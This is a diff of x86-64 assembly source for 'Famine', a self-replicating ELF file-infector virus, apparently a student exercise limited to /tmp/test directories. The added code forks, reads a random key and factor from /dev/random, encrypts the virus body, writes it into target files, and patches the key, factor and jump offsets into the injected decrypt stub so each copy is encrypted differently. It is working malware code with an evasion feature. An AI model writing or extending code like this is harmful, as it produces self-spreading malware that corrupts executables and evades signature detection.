@@ -8,15 +8,35 @@ PUSH
 jmp .enc_start
 DECYPHER
 
+
 .enc_start:
-;	mov rax, _fork
-;	syscall
-;	cmp rax, 0
-;	POP
-;	jne _exx
+	mov rax, _fork
+	syscall
+	cmp rax, 0
+	POP
+	jne _exx
 
 	mov rbp, rsp
- 	sub rbp, famine_size  ; reserve famine_size bytes on the stack
+	sub rbp, famine_size  ; reserve famine_size bytes on the stack
+.get_rand_key:
+	lea rdi, [rel random]
+	mov rsi, O_RDONLY
+	mov rax, _open
+	syscall					; OPEN /dev/random  EXIT if not work
+	cmp rax, 0
+	jl	_exx_pop
+
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 1
+	lea rsi, STACK(famine.key)
+	syscall				; READ 2 byte, 1 for key, 1 for derivate
+	
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 1
+	lea rsi, STACK(famine.factor)
+	syscall				; READ 2 byte, 1 for key, 1 for derivate
 	lea rdi, [rel infect_dir] ; load dir str
 
 .opendir:
@@ -208,10 +228,10 @@ inject_self:
 	pop r13
 	sub r13, .delta
 	
-	;cypher and write v
+	; load cypher and write v
 	lea rsi, [r13 + _start] ; load _start addr to rsi
 	mov rdx, _end - _start  ; virus size to rdx
-	lea r10, STACK(famine.tocypher)
+	lea r10, STACK(famine.tocypher)  ; r10 hold future v-location in stack
 	.loading_v:
 		mov r11b, byte[rsi]
 		mov [r10], r11b
@@ -221,6 +241,7 @@ inject_self:
 		cmp rdx, 0
 		jg .loading_v
 	CYPHER
+
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	lea rsi, STACK(famine.tocypher)
 	mov rdx, _end - _start  ; virus size to rdx
@@ -232,11 +253,31 @@ inject_self:
 	cmp rax, 0
 	jbe .return
 
+	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
 	lea rsi, [rel signature]
 	mov rdx, 1
-	add r10, 25
+	add r10, 25 ; FILE EOF + 25 = JUMP OVER DECYPHER VAL OFFSET
 	syscall
+
+	pop r10
+	push r10
+	mov rdi, STACK(famine.file_fd) ; fd to rdi
+	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
+	lea rsi, STACK(famine.key)
+	mov rdx, 1
+	add r10, 30 ; FILE OEF + 30 = KEY OFFSET
+	syscall
+
+	pop r10
+	push r10
+	mov rdi, STACK(famine.file_fd) ; fd to rdi
+	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
+	lea rsi, STACK(famine.factor)
+	mov rdx, 1
+	add r10, 79 ; FILE EOF + 80 = KEY FACTOR OFFSET
+	syscall
+
 
 	.edit_phdr:
 	pop rax				;RDI = the offset of patched PHEADER
@@ -313,11 +354,14 @@ inject_self:
 		ret
 
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
+random			db			"/dev/random"
 enc_end:
 	db 0
 signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
 famine_entry	dq			_start
 
+_exx_pop:
+POP
 _exx:
 jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
 	.exit:
